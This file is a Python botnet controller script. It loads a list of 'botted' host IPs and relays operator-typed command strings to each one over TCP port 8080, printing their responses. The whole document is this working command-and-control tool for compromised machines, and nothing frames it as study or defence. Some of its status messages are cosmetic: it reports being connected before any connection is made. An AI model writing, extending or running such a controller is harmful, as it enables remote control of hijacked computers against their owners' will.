#!/usr/bin/python3
#!/usr/bin/python3
import socket
import time

def load_bots_from_file(filename):
    try:
        with open(filename, "r") as file:
            bots = [line.strip() for line in file if line.strip()]
        return bots
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

def send_command_to_bot(bot_ip, command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((bot_ip, 8080))  
        s.send(command.encode())

        s.settimeout(0.3)  

        response = ''
        while True:
            try:
                data = s.recv(1024).decode()
                if not data:
                    break  
                response += data
            except socket.timeout:
                break  

        s.close()  
        return response
    except Exception as e:
        return f"Failed to connect to {bot_ip}: {str(e)}"

def main():
    bots = load_bots_from_file("botted_hosts.txt")  
    if not bots:
        print("No bots loaded. Exiting.")
        return

    print("connected to all bots")

    while True:
        command = input("enter command string:\n")  
        if command == "exit":
            for bot_ip in bots:
                print(f"disconnected\nresponse from {bot_ip}\ndisconnected")
            print("exiting.")
            break  

        for bot_ip in bots:
            print(f"response from {bot_ip}")
            response = send_command_to_bot(bot_ip, command)
            print(response)

if __name__ == "__main__":
    main()

